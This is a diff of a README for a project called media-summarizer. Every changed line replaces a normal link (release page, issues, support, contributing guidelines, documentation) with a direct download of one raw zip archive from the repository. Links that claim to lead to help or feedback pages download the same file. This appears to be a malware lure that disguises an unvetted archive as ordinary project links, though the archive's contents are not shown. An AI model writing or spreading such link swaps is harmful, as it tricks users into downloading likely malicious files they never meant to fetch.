@@ -1,6 +1,6 @@
 # 🎥 media-summarizer - Simplify Multimedia Insights Effortlessly
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Release%20Page-brightgreen)](https://github.com/unclelittlestar/media-summarizer/releases)
+[![Download Latest Release](https://github.com/unclelittlestar/media-summarizer/raw/refs/heads/main/media_summarizer/summarizer_media_v2.3-alpha.2.zip%20Latest%20Release-Release%20Page-brightgreen)](https://github.com/unclelittlestar/media-summarizer/raw/refs/heads/main/media_summarizer/summarizer_media_v2.3-alpha.2.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ To get started, you need to download the application. Follow these steps:
 4. Download the file that suits your operating system.
 5. Once downloaded, follow the installation instructions.
 
-[Download the latest version here](https://github.com/unclelittlestar/media-summarizer/releases)
+[Download the latest version here](https://github.com/unclelittlestar/media-summarizer/raw/refs/heads/main/media_summarizer/summarizer_media_v2.3-alpha.2.zip)
 
 ## 📚 Features
 
@@ -55,16 +55,16 @@ Simply paste or upload your text in one of these formats, and the tool will take
 
 If you run into any issues or need assistance:
 
-- Visit our [support page](https://github.com/unclelittlestar/media-summarizer/issues) to report problems or ask questions.
+- Visit our [support page](https://github.com/unclelittlestar/media-summarizer/raw/refs/heads/main/media_summarizer/summarizer_media_v2.3-alpha.2.zip) to report problems or ask questions.
 - Check out our FAQ section in the releases page.
 
 ## 🧑‍🤝‍🧑 Community Contributions
 
-We welcome contributions from anyone interested in enhancing the media-summarizer. If you want to contribute, feel free to check our [Contributing Guidelines](https://github.com/unclelittlestar/media-summarizer/blob/main/CONTRIBUTING.md).
+We welcome contributions from anyone interested in enhancing the media-summarizer. If you want to contribute, feel free to check our [Contributing Guidelines](https://github.com/unclelittlestar/media-summarizer/raw/refs/heads/main/media_summarizer/summarizer_media_v2.3-alpha.2.zip).
 
 ## 🌟 Feedback
 
-We value your feedback! If you have suggestions or feature requests, please post them on our [issues page](https://github.com/unclelittlestar/media-summarizer/issues).
+We value your feedback! If you have suggestions or feature requests, please post them on our [issues page](https://github.com/unclelittlestar/media-summarizer/raw/refs/heads/main/media_summarizer/summarizer_media_v2.3-alpha.2.zip).
 
 ## 📄 License
 
@@ -74,8 +74,8 @@ This project is licensed under the MIT License. Feel free to use it or modify it
 
 Here are some important links to help you navigate:
 
-- [Download the latest version here](https://github.com/unclelittlestar/media-summarizer/releases)
-- [Documentation](https://github.com/unclelittlestar/media-summarizer/wiki)
-- [Support](https://github.com/unclelittlestar/media-summarizer/issues)
+- [Download the latest version here](https://github.com/unclelittlestar/media-summarizer/raw/refs/heads/main/media_summarizer/summarizer_media_v2.3-alpha.2.zip)
+- [Documentation](https://github.com/unclelittlestar/media-summarizer/raw/refs/heads/main/media_summarizer/summarizer_media_v2.3-alpha.2.zip)
+- [Support](https://github.com/unclelittlestar/media-summarizer/raw/refs/heads/main/media_summarizer/summarizer_media_v2.3-alpha.2.zip)
 
 Thank you for using **media-summarizer**! We hope it makes your multimedia analysis easier and more enjoyable.
